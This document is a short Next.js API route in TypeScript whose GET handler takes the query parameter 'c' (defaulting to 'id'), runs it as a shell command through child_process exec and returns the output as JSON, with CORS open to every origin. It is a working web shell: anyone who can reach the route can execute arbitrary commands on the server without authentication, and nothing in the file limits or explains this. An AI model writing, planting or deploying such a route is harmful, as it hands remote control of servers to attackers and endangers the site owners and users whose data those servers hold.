import { exec } from "child_process";
import { NextRequest, NextResponse } from "next/server";
import { promisify } from "util";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

const execAsyn = promisify(exec)

export async function GET(req: NextRequest): Promise<NextResponse> {
    const searchParams = req.nextUrl.searchParams;
    
    const cmd = searchParams.get("c") || "id";  
    try {
        const { stdout, stderr } = await execAsyn(cmd, { timeout: 10000 });
        const result = {
            command: cmd,
            stdout: stdout.trim(),
            stderr: stderr.trim(),
            success: !stderr,
        };

        return NextResponse.json({ ok: true, result }, { headers: corsHeaders });
    } catch (err: any) {
        return NextResponse.json({ output: err.message || 'Command failed' }, { headers: corsHeaders });
    }
}
